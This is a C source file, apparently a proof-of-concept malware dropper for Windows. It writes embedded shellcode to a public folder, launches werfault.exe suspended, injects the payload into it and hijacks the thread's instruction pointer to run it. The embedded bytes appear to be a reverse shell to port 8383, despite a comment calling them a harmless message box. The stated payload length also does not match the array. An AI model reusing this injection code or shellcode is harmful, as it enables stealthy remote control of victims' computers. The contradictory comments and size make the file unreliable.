#include <windows.h>
#include <stdio.h>

// This is the SIMULATED binary content of "werflt.exe".
// In a real malware, this would be the actual bytes of the second-stage payload.
// For this PoC, we will create a simple executable and embed it here.
unsigned char raw_werflt_exe[] = {
    // This is a minimal, custom-made .exe that just shows a message box.
    // You would replace this array with the actual bytes of your real payload.
    // 127.0.0.1 8383
0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48,0x8b,0x70,0x18,0x48,0x8b,0x76,0x30,0x4c,0x8b,0x0e,0x4d,
0x8b,0x09,0x4d,0x8b,0x49,0x10,0xeb,0x63,0x41,0x8b,0x49,0x3c,0x4d,0x31,0xff,0x41,0xb7,0x88,0x4d,0x01,
0xcf,0x49,0x01,0xcf,0x45,0x8b,0x3f,0x4d,0x01,0xcf,0x41,0x8b,0x4f,0x18,0x45,0x8b,0x77,0x20,0x4d,0x01,
0xce,0xe3,0x3f,0xff,0xc9,0x48,0x31,0xf6,0x41,0x8b,0x34,0x8e,0x4c,0x01,0xce,0x48,0x31,0xc0,0x48,0x31,
0xd2,0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xca,0x0d,0x01,0xc2,0xeb,0xf4,0x44,0x39,0xc2,0x75,0xda,0x45,
0x8b,0x57,0x24,0x4d,0x01,0xca,0x41,0x0f,0xb7,0x0c,0x4a,0x45,0x8b,0x5f,0x1c,0x4d,0x01,0xcb,0x41,0x8b,
0x04,0x8b,0x4c,0x01,0xc8,0xc3,0xc3,0x4c,0x89,0xcd,0x41,0xb8,0x8e,0x4e,0x0e,0xec,0xe8,0x8f,0xff,0xff,
0xff,0x49,0x89,0xc4,0x48,0x31,0xc0,0x66,0xb8,0x6c,0x6c,0x50,0x48,0xb8,0x57,0x53,0x32,0x5f,0x33,0x32,
0x2e,0x64,0x50,0x48,0x89,0xe1,0x48,0x83,0xec,0x20,0x4c,0x89,0xe0,0xff,0xd0,0x48,0x83,0xc4,0x20,0x49,
0x89,0xc6,0x49,0x89,0xc1,0x41,0xb8,0xcb,0xed,0xfc,0x3b,0x4c,0x89,0xcb,0xe8,0x55,0xff,0xff,0xff,0x48,
0x31,0xc9,0x66,0xb9,0x98,0x01,0x48,0x29,0xcc,0x48,0x8d,0x14,0x24,0x66,0xb9,0x02,0x02,0x48,0x83,0xec,
0x30,0xff,0xd0,0x48,0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0xd9,0x09,0xf5,0xad,0xe8,0x2b,0xff,0xff,
0xff,0x48,0x83,0xec,0x30,0x48,0x31,0xc9,0xb1,0x02,0x48,0x31,0xd2,0xb2,0x01,0x4d,0x31,0xc0,0x41,0xb0,
0x06,0x4d,0x31,0xc9,0x4c,0x89,0x4c,0x24,0x20,0x4c,0x89,0x4c,0x24,0x28,0xff,0xd0,0x49,0x89,0xc4,0x48,
0x83,0xc4,0x30,0x49,0x89,0xd9,0x41,0xb8,0x0c,0xba,0x2d,0xb3,0xe8,0xf3,0xfe,0xff,0xff,0x48,0x83,0xec,
0x20,0x4c,0x89,0xe1,0x48,0x31,0xd2,0xb2,0x02,0x48,0x89,0x14,0x24,0x48,0x31,0xd2,0x66,0xba,0x20,0xbf,
0x48,0x89,0x54,0x24,0x02,0xba,0x81,0xff,0xff,0xfe,0x48,0xf7,0xda,0x48,0x89,0x54,0x24,0x04,0x48,0x8d,
0x14,0x24,0x4d,0x31,0xc0,0x41,0xb0,0x16,0x4d,0x31,0xc9,0x48,0x83,0xec,0x38,0x4c,0x89,0x4c,0x24,0x20,
0x4c,0x89,0x4c,0x24,0x28,0x4c,0x89,0x4c,0x24,0x30,0xff,0xd0,0x48,0x83,0xc4,0x38,0x49,0x89,0xe9,0x41,
0xb8,0x72,0xfe,0xb3,0x16,0xe8,0x96,0xfe,0xff,0xff,0x48,0xba,0x9c,0x92,0x9b,0xd1,0x9a,0x87,0x9a,0xff,
0x48,0xf7,0xd2,0x52,0x48,0x89,0xe2,0x41,0x54,0x41,0x54,0x41,0x54,0x48,0x31,0xc9,0x66,0x51,0x51,0x51,
0xb1,0xff,0x66,0xff,0xc1,0x66,0x51,0x48,0x31,0xc9,0x66,0x51,0x66,0x51,0x51,0x51,0x51,0x51,0x51,0x51,
0xb1,0x68,0x51,0x48,0x89,0xe7,0x48,0x89,0xe1,0x48,0x83,0xe9,0x20,0x51,0x57,0x48,0x31,0xc9,0x51,0x51,
0x51,0x48,0xff,0xc1,0x51,0xfe,0xc9,0x51,0x51,0x51,0x51,0x49,0x89,0xc8,0x49,0x89,0xc9,0xff,0xd0
    // ... [Hundreds/Thousands of bytes of the actual PE file] ...
};
unsigned int raw_werflt_exe_len = 1024; // This must be the actual size of the array

// Function to drop the embedded binary to disk
BOOL DropPayload() {
    HANDLE hFile = CreateFileA("C:\\Users\\Public\\werflt.exe",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create file. Error: %d\n", GetLastError());
        return FALSE;
    }

    DWORD bytesWritten;
    if (!WriteFile(hFile, raw_werflt_exe, raw_werflt_exe_len, &bytesWritten, NULL)) {
        printf("[-] Failed to write file. Error: %d\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    printf("[+] Successfully dropped payload to: C:\\Users\\Public\\werflt.exe\n");
    CloseHandle(hFile);
    return TRUE;
}

int main() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    PVOID remoteBuffer = NULL;
    HANDLE hFile = NULL;
    HANDLE hFileMapping = NULL;
    PVOID localBuffer = NULL;

    si.cb = sizeof(si);

    printf("[+] Malware Stage 0 Started (Dropper)\n");

    // 1. Drop the payload binary to disk
    if (!DropPayload()) {
        return -1;
    }

    // 2. Create a suspended werfault.exe process (the decoy)
    printf("[+] Creating suspended werfault.exe process...\n");
    if (!CreateProcessA("C:\\Windows\\System32\\werfault.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED, // Critical flag
        NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create suspended process. Error: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Suspended process created. PID: %d\n", pi.dwProcessId);

    // 3. Read the dropped file (werflt.exe) into our own memory
    hFile = CreateFileA("C:\\Users\\Public\\werflt.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open dropped payload. Error: %d\n", GetLastError());
        return -1;
    }

    hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hFileMapping) {
        printf("[-] Failed to create file mapping. Error: %d\n", GetLastError());
        CloseHandle(hFile);
        return -1;
    }

    localBuffer = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!localBuffer) {
        printf("[-] Failed to map view of file. Error: %d\n", GetLastError());
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return -1;
    }

    // Get the size of the payload for injection
    DWORD payloadSize = GetFileSize(hFile, NULL);

    // 4. Allocate memory in the suspended target process
    remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("[-] VirtualAllocEx failed. Error: %d\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Allocated memory in remote process at: 0x%p\n", remoteBuffer);

    // 5. Write the payload (werflt.exe) into the target process
    if (!WriteProcessMemory(pi.hProcess, remoteBuffer, localBuffer, payloadSize, NULL)) {
        printf("[-] WriteProcessMemory failed. Error: %d\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Wrote %d bytes of werflt.exe into werfault.exe memory.\n", payloadSize);

    // 6. Hijack the execution flow of the suspended thread to run our payload
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] GetThreadContext failed. Error: %d\n", GetLastError());
        goto CLEANUP;
    }

    // On x64, set the Instruction Pointer (RIP) to the start of our injected code
#ifdef _M_IX86
    ctx.Eip = (DWORD_PTR)remoteBuffer;
#else
    ctx.Rip = (DWORD_PTR)remoteBuffer;
#endif

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] SetThreadContext failed. Error: %d\n", GetLastError());
        goto CLEANUP;
    }
    printf("[+] Execution context hijacked to point to werflt.exe in memory.\n");

    // 7. Resume the thread - the injected werflt.exe now runs!
    if (ResumeThread(pi.hThread) != (DWORD)-1) {
        printf("[+] Thread resumed!\n");
        printf("[+] werflt.exe is now running inside the hollowed werfault.exe process.\n");
        printf("[+] malwarestage0 is exiting. Handoff complete.\n");
    }

CLEANUP:
    // Clean up all handles
    if (localBuffer) UnmapViewOfFile(localBuffer);
    if (hFileMapping) CloseHandle(hFileMapping);
    if (hFile) CloseHandle(hFile);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}



